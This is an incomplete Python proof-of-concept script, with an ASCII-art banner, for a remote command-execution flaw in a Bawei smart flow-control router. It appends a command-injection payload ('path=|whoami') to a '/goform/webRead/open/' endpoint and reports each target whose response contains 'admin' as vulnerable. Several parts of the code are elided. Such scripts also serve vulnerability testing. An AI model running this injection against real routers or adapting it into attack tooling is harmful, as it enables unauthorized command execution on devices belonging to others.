               ...
               `88'       88           8888"88,     88 88   `8b  88 88      88888  
                ...
                88        88           88     "88,  88 88     `888   `"Y88888P"   
                            ...
                            888888888888 
                                        ...
                                        tag: this is a 百为智能流控路由器RCE poc
...
def poc(target):
    if target[-1] == '/':
        ...
        target = target
    path = "/goform/webRead/open/?path=|whoami"
    url = target + path
    headers = {
    ...
    try:
        ...
        if response1.status_code == 200 and  'admin' in response1.text:

            print(f"[++++++] {target} 存在 百为智能流控路由器RCE")
